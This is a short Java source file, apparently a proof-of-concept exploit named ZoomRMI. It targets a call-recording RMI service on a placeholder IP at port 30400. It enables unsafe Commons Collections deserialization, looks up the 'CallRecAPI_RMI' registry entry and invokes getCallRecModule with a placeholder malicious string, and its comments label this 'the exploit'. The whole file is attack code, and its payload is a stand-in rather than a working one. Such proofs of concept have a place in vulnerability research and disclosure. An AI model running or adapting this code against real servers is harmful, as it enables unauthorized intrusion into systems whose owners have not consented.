import java.rmi.registry.LocateRegistry;  
import java.rmi.registry.Registry;  
import java.util.Properties;  
import java.rmi.Remote;
import java.rmi.RemoteException;

// stub interface and method required for the exploit
interface IRMICallRecAPI extends Remote {
    Remote getCallRecModule(String str) throws RemoteException;
}
  
public class ZoomRMI {  
    private static final String host = "<TARGET_IP>";  
    private static final int port = 30400;  
  
    public static void main(String[] args) {  
  
        try {  
            String serverIP = host;  
            int serverPort = port;  
            Properties props = System.getProperties();  
            props.setProperty("org.apache.commons.collections.enableUnsafeSerialization", "true");
  
            System.out.println("Starting");  
            Registry registry = LocateRegistry.getRegistry(serverIP, serverPort);  
            System.out.println("Reg fetch ok");  
            IRMICallRecAPI CallRecAPI_RMI = (IRMICallRecAPI) registry.lookup("CallRecAPI_RMI");
            CallRecAPI_RMI.getCallRecModule("Mal_String_Mal");
            System.out.println("Exploit");
  
        } catch (Exception e) {  
            e.printStackTrace();  
        }  
    }  
}
